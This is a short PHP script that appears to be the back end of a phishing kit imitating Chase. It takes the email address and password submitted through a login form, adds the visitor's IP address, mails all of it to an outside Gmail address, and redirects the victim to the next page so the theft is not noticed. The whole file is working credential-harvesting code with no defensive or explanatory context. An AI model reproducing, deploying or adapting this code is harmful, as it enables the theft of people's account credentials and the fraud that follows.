<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Email chase || :------\n";
$message .= "Email account: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || THckingE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="klinemorgan004@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: page5.html");
?>